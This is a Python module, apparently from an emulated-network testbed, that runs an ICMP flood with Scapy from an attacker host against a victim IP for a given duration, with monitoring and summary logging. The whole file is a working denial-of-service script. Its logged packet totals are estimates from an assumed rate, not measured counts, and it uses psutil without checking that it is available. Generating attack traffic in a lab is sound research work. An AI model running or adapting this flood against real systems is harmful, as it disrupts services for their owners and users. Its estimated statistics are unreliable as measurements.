import time
import subprocess
import signal
import logging
import uuid
import threading
# Optional psutil import - gracefully handle if missing
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
import random
from scapy.all import Ether, IP, ICMP, sendp, sr1

# Suppress Scapy warnings
import warnings
warnings.filterwarnings("ignore", message="Mac address to reach destination not found.*")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configure logging for this module
attack_logger = logging.getLogger('attack_logger')

def run_attack(attacker_host, victim_ip, duration):
    run_id = str(uuid.uuid4())  # Generate a unique ID for this attack run
    start_time = time.time()
    
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Starting Simple ICMP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack Phase: Simple ICMP Flood - Attacker: {attacker_host.name}, Target: {victim_ip}, Duration: {duration}s")
    
    # Test target reachability
    try:
        ping_start = time.time()
        ping_reply = sr1(IP(dst=victim_ip)/ICMP(), timeout=2, verbose=0)
        ping_time = time.time() - ping_start
        if ping_reply and ping_reply.haslayer(ICMP):
            icmp_type = ping_reply[ICMP].type
            if icmp_type == 0:  # Echo Reply
                attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Target {victim_ip} is reachable (ICMP Echo Reply: {ping_time:.3f}s)")
            else:
                attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Target {victim_ip} responded with ICMP type {icmp_type} (time: {ping_time:.3f}s)")
        else:
            attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Target {victim_ip} ICMP timeout after {ping_time:.3f}s")
    except Exception as e:
        attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Unable to ping target {victim_ip}: {e}")
    
    # Start simple ICMP flood
    attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Starting simple ICMP packet generation")
    
    # Create a simple attack process using basic scapy flooding
    simple_scapy_cmd = f"""
import time
import random
from scapy.all import *

def simple_icmp_flood():
    interface = '{attacker_host.intfNames()[0]}'
    target_ip = '{victim_ip}'
    base_interval = 0.01
    
    packet_count = 0
    while True:
        try:
            # Create basic ICMP packet
            icmp_id = random.randint(1, 65535)
            icmp_seq = packet_count % 65536
            
            packet = Ether()/IP(dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)
            sendp(packet, iface=interface, verbose=0)
            
            packet_count += 1
            
            # Simple fixed interval
            time.sleep(base_interval)
        
        except Exception as e:
            break

simple_icmp_flood()
"""
    
    process = attacker_host.popen(['python3', '-c', simple_scapy_cmd])
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Simple ICMP flood process started (PID: {process.pid})")
    
    # Simple monitoring
    packets_sent = 0
    monitoring_interval = max(1, duration // 5)  # Monitor 5 times during attack
    next_monitor = time.time() + monitoring_interval
    
    while time.time() - start_time < duration:
        current_time = time.time()
        elapsed = current_time - start_time
        
        if current_time >= next_monitor:
            # Estimate packets sent with simple rate (100 pps)
            base_rate = 100  # Simple rate
            estimated_packets = int(elapsed * base_rate)
            packets_sent = estimated_packets
            
            # Monitor process status
            try:
                if process.poll() is None:
                    proc_info = psutil.Process(process.pid)
                    cpu_percent = proc_info.cpu_percent()
                    memory_mb = proc_info.memory_info().rss / 1024 / 1024
                    
                    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack progress: {elapsed:.1f}s elapsed, ~{estimated_packets} packets sent, Rate: {estimated_packets/elapsed:.1f} pps")
                    attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Process stats - CPU: {cpu_percent:.1f}%, Memory: {memory_mb:.1f}MB")
                else:
                    attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Attack process terminated unexpectedly")
                    break
            except Exception as e:
                attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Unable to get process stats: {e}")
            
            next_monitor = current_time + monitoring_interval
        
        time.sleep(0.1)  # Simple monitoring interval
    
    # Stop the attack
    stop_time = time.time()
    actual_duration = stop_time - start_time
    
    try:
        if process.poll() is None:
            process.send_signal(signal.SIGINT)
            attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Sent SIGINT to ICMP flood process {process.pid}")
            time.sleep(0.5)
        
        if process.poll() is None:
            process.terminate()
            attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Force terminated ICMP flood process {process.pid}")
    except Exception as e:
        attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Error stopping attack process: {e}")
    
    process.wait()
    
    # Calculate final statistics
    base_rate = 100  # Simple rate
    final_packets_sent = int(actual_duration * base_rate)
    avg_rate = final_packets_sent / actual_duration if actual_duration > 0 else 0
    
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Simple ICMP Flood from {attacker_host.name} to {victim_ip} finished.")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack completed. Total packets sent = {final_packets_sent}, Average rate = {avg_rate:.2f} packets/sec.")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] --- Simple Attack Summary ---")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Total packets sent: {final_packets_sent}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Actual duration: {actual_duration:.2f}s")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Average rate: {avg_rate:.2f} packets/sec")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Base rate: {base_rate:.1f} pps")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] ICMP type: Echo Request (8) with ID/Seq variations")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack method: Simple ICMP Flood")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] ----------------------------------------")
    
    return process